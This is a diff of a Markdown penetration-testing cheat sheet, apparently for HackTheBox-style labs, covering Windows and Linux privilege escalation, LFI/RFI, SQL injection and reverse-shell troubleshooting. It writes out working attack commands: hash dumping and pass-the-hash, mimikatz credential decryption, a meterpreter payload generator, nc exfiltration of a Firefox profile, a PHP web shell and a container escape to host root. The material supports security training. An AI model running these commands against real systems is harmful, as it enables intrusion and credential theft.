@@ -158,6 +158,7 @@ mssqlclient.py user@x.x.x.x -windows-auth
 
 ## Oracle - 1521
 Use ODAT tool for attacking database
+
 https://github.com/quentinhardy/odat
 
 
@@ -167,30 +168,43 @@ https://github.com/quentinhardy/odat
 nmap --script redis-info -sV -p 6379 x.x.x.x
 ```
 Either upload a webshell or ssh keys and get access to the box.
+
 https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
 
 ## Windows - Privilege Escalation Quick Wins!
 1. CHM Priv escalation
+
 https://www.youtube.com/watch?v=k7gD4ufex9Q
 https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7
 
 2. SAM & SYSTEM
-If we are able to dump both SAM & SYSTEM file, then use following command to dump
-hashes out of it.
-impacket-secretdump -sam SAM -system SYSTEM local
-Then PASS-THE-HASH to tools like smbmap or psexec
+
+If we are able to dump both SAM & SYSTEM file, then use following command to dumpnhashes out of it.
+
+impacket-secretdump -sam SAM -system SYSTEM local Then PASS-THE-HASH to tools like smbmap or psexec
 
 3. Juicy Potato
+
 Doesn't work on Win10 and Win2019
+
 whoami /priv to check for following privileges:
+
 • SeImpersonatePrivilege
+
 • SeAssignPrimaryPrivilege
+
 • SeTcbPrivilege
+
 • SeBackupPrivilege
+
 • SeRestorePrivilege
+
 • SeCreateTokenPrivilege
+
 • SeLoadDriverPrivilege
+
 • SeTakeOwnershipPrivilege
+
 • SeDebugPrivilege
 https://github.com/ohpe/juicy-potato
 
@@ -201,16 +215,22 @@ cmd juicypotato.exe -t * -p “Program to launch” -l 9001
 Reference Machine - Conceal HTB
 
 4. GPP Password
+
 Use PowerUP.ps1 in order to extract Group Policy Passwords
 
 5. Procdump
+
 Dump process of services running like browsers in order to extract credentials.
 
 6. Kerberoasting by using GetUserSPNs.py Impacket Script
+
 Use this script to check if any user is vulnerable to kerberoasting.
+```
 GetUserSPNs.py -request -dc-ip x.x.x.x domain.name/user
+```
 
 7. Exploiting “runas /savecred"
+
 Use cmdkey /list to check for stored credentials.
 ```
 $WScript = New-Object -ComObject Wscript.Shell
@@ -224,22 +244,28 @@ $Wscript.CreateShortcut($shortcut)
 Tips
 
 8.1 If it is getting block by group policy, search for Applocker Bypass list.
-https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-
-AppLockerbypasses.md
+https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
 
 8.2 If this list didn't work then go for meterpreter by using Unicorn.
+
 python unicorn.py windows/meterpreter/reverse_http LHOST LPORT
+
 It will generate 2 files:
+
 a. powershell_attack.txt - save it as msf.ps1
+
 b. unicorn.rc - use this to load msfconsole (msfconsole -r unicorn.rc)
+
 Download and run msf.ps1 on Target machine.
 
 8.3 If unicorn is not working then go for Empire.
+
 Reference Machine - Access HTB machine
 
 9. DPAPI
-Download masterkey file: c:\users\localuser\appdata\Roaming\Microsoft\Protect\x-x-x-xxxxx-
-xxxxxx\
+
+Download masterkey file: c:\users\localuser\appdata\Roaming\Microsoft\Protect\x-x-x-xxxxx-xxxxxx\
+
 Download Credential file: C:\users\localuser\appdata\Roaming\Microsoft\Credentials\
 
 Then on your local machine run following command on mimikatz to get a masterkey:
@@ -254,16 +280,17 @@ mimikatz# dpapi::cred /in:Credentials-filemimikatz# dpapi::cred /in:Credentials-
  
 
 10. ADRecyclebin Deleted Objects Recover
-Use below command:
-Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -
-includeDeletedObjects -property *
 
-Reference link: https://www.poweradmin.com/blog/restoring-deleted-objects-fromactive-
-directory-using-ad-recycle-bin/
+Use below command:
+
+```
+Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
+```
+Reference link: https://www.poweradmin.com/blog/restoring-deleted-objects-fromactive-directory-using-ad-recycle-bin/
 
 11. AutoLogon Credentials Reuse
-After running PowerUp we may end up getting AutoLogon creds which we cn use for
-escalating privileges
+
+After running PowerUp we may end up getting AutoLogon creds which we cn use for escalating privileges
 
 ```
 $passwd = ConvertTo-SecureString ‘PasswordofAdmin’ -AsPlainText -Force
@@ -276,6 +303,7 @@ Start-Process -FilePath “powershell” -argumentlist “IEX(New-Object Net.Web
 ```
 
 12. Use cacls
+
 To check Access Control:
 ```
 Get-ACL file.txt | fl *
@@ -291,28 +319,32 @@ pth-winexe -U jeeves/Administrator%NLTMHash //ServerIP cmd
 ```
 
 14. MS14-680
-https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
-Reference Machine - Mantis
+
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek Reference Machine - Mantis
 
 15. APLC Task Scheduler LPE
+
 https://nvd.nist.gov/vuln/detail/CVE-2018-8440
-In order to run this exploit we should have READ EXECUTE Access to Authenticated
-Users
+
+In order to run this exploit we should have READ EXECUTE Access to Authenticated Users
+
 icacls c:\Windows\Tasks folder
-Machine Reference - Conceal
+
+Reference Machine - Conceal
 
 ## Linux - Privilege Escalation Quick Wins!
 1. SSH Files found:
+
 if id_rsa file found then use ssh2john.py to crack the encypted password.
 ```
 chmod 400 id_rsa
 ssh -i id_rsa user@x.x.x.x
 ```
 
-2. Look for services running locally which are not exposed to the public and to tunnel
-them to your box.
+2. Look for services running locally which are not exposed to the public and to tunnel them to your box.
 
 3. Create SSH keys:
+
 This will create user.pub and user file
 ```
 ssh-keygen -f user
@@ -321,29 +353,46 @@ ssh -i user localuser@x.x.x.x
 ```
 
 4. Screen 4.5.0 Local Priv Esc
+
 https://www.exploit-db.com/exploits/41154
+
 
 5. Use sudo -l to check what commads/ script we can execute as a root user.
 
+
 6. Redhat/CentOS root through network-scripts
+
 Command execution by simply providing input space command in the script.
+
 https://seclists.org/fulldisclosure/2019/Apr/24
+
 Reference Machine - Networked HTB
 
+
 7. Vault taken
+
 https://www.vaultproject.io/docs/concepts/tokens.html
+
 Reference Machine - Craft HTB
 
+
 8. Logstash input as a command
+
 Reference machine - Haystack
+
 
 9. SystemCTL SUID exploitation
 
+
 10. PATH Hijacking using pspy
+
 To check which group our user belongs to groups
+
 To find out files and folders owned by group
+```
 find / -group group_name 2>/dev/null
 echo $PATH.
+```
 Reference Machine - WriteUp HTB
 
 12. Vim
@@ -352,6 +401,7 @@ sudo /usr/bin/vi /var/www/html/anyfilewhichwecanaccessasaroot -c ‘:!/bin/bash�
 ```
 
 13. Priv Esc via LXD
+
 https://reboare.github.io/lxd/lxd-escape.html
 ```
 lxc init ubuntu:16.04 blah -c security.privileged=true
@@ -360,7 +410,8 @@ lxc config device add blah root disk source=/ path=/mnt/root recursive=true
 Steps
 
 13.1 Create a alpine build locally.
-Link: https://github.com/saghul/lxd-alpine-builder
+
+https://github.com/saghul/lxd-alpine-builder
 
 13.2 Transfer tar.gz file on remote machine.
 ```
@@ -380,6 +431,7 @@ lxc image list
 lxc init alpine privesc -c security.privileged=true
 ```
 13.6 lxc list to view machine
+
 13.7 Mount hard drive to the machine
 ```
 lxc config device add privesc host-root disk source=/ path=/mnt/root/
@@ -389,11 +441,13 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root/
 lxc start privesc
 ```
 13.9 lxc exec privesc /bin/sh
+
 Reference Machine - Calamity
 
+
 14. Module Hijacking
-If abc.py script is importing some module from def.py and if we have write access to
-def.py we can perform a Module Hijacking.
+
+If abc.py script is importing some module from def.py and if we have write access to def.py we can perform a Module Hijacking.
 example,
 ```
 shell = ‘’'
@@ -405,9 +459,13 @@ f.write(shell)
 f.close()
 ```
 
+
 15. Inspecting Mozilla Firefox Profile
+
 Check for .mozilla folder.
-Gain saved crdentials using tools like
+
+Gain saved credentials using tools like
+
 firefox_decrypt - https://github.com/unode/firefox_decrypt
 firepwd - https://github.com/lclevy/firepwd
 Transfer files as
@@ -418,51 +476,62 @@ nc x.x.x.x 1234 < mozilla.zip
 ```
 
 16. Linux Capabilities
-For the purpose of performing permission checks, traditional UNIX implementations
-distinguish two categories of processes: privileged processes (whose effective user ID
-is 0, referred to as superuser or root) & unprivileged processes (whose effective UID is
-nonzero). Privileged processes bypass all kernel permission checks, while
-unprivileged processes are subject to full permission checking based on the process's
-credentials (usually: effective UID, effective GID, and supplementary group list).
+For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID
+is 0, referred to as superuser or root) & unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID, and supplementary group list).
 
 How to detect:
 ```
 getcap -r / 2>/dev/null
 ```
 If you find ep (effective and permitted) binary
+
 then go to gtfobins and exploit it.
 example,
+
 https://gtfobins.github.io/gtfobins/openssl/#file-read
+
 With File Read Write ability, modify sudoers
+
 Reference Machine - Lightweight HTB
 
+
 17. PostgreSQL, PAM and NSS
+
 Enumerate for Passwords under a web directory /var/www/html:
 ```
 grep -iRe password
 ```
 https://serverfault.com/questions/538383/understand-pam-and-nss/538503#538503
+
 Reference Machine - RedCross HTB
 
+
 18. H2 Database
+
 https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
-H2 is an open source database management system written in Java. Curl is used to
-verify that the login page is accessible internally.
+
+H2 is an open source database management system written in Java. Curl is used to verify that the login page is accessible internally.
 ```
 curl -g -6 ‘http://[::1]:8002'
 ```
 ps aux | grep h2 # To detect H2 DBMS version
 
+
 19. Docker Privileges
+
 id # Check if current user belongs to docker group
 ```
 docker images --all # Reveals available images on the system.
 docker run --rm -v /:/hostOS -t1 imageonbox sh
 ```
 
+
 20. Homer - Apache CouchDB
+
 Exploit: https://www.exploit-db.com/exploits/44913
+
 Explanation: https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
+
 How to detect by running following command:
 ```
 ps aux
@@ -477,13 +546,14 @@ ps aux
 /windows/pather/unattend.xml
 ```
 
-2. In case if you are not getting anything sensitive information or not able to exploit it,
-go for RFI by hosting a local SMB server and confirm it by running nc on 445 eg.
+
+2. In case if you are not getting anything sensitive information or not able to exploit it, go for RFI by hosting a local SMB server and confirm it by running nc on 445 eg.
 ```
 http://example.php?file=\\10.10.14.111\xxx\file.txt
 nc -lvnp 445
 ```
 If receive hits on nc it means it is vulnerable to RFI.
+
 
 3. Also run responder and try to get a NTLMv2 hash
 ```
@@ -491,7 +561,9 @@ responder -I eth0
 
 ```
 
+
 4. Use tcpdump to verify
+
 tcpdump -i eth0 port 445
 
 
@@ -499,11 +571,12 @@ tcpdump -i eth0 port 445
 ## RCE Scenario
 1. Use nishang's Invoke-PowerShellTcp.ps1
 
-2. If it is not working then check if powershell CONSTRAINED MODE by using
-following command.
+
+2. If it is not working then check if powershell CONSTRAINED MODE by using following command.
 ```
 powershell.exe $ExecutionContext.SessionState.LanguageMode
 ```
+
 
 3. In such a scenario we can drop nc on server via our locally hosted smb server and get a reverse connection.
 ```
@@ -544,8 +617,9 @@ http://x.x.x.x/test.php?id=-1 union select 1,lod_file('/etc/passwd'),3,4,5 into 
 www/html/test.txt’
 ```
 After that visit http://x.x.x.x/test.txt
-Also check default 000-default.conf which is under /etc/apache2/sites-enabled/000-
-dafeult-conf
+
+Also check default 000-default.conf which is under /etc/apache2/sites-enabled/000-dafeult-conf
+
 also one can achieve a web shell by injection a php file:
 ```
 <?php system($_REQUEST["exec"]);?>
@@ -558,11 +632,12 @@ https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-ca
 https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/ 
 
 ## Reverse Connection Issues
-1. If reverse shell dies instantly use following command to check if any sort of intrusion
-system is present on the box.
+1. If reverse shell dies instantly use following command to check if any sort of intrusion system is present on the box.
+
 find /home -ctime -60 # It will giv all files modified in last 60 minutes on box
-In such scenario cp /bin/nc to /dev/shm/newname - rewrite nc to newfile name
-and try to execute the nc command again.
+
+In such scenario cp /bin/nc to /dev/shm/newname - rewrite nc to newfile name and try to execute the nc command again.
+
 
 2. Try listening on port 80 or 443.
 
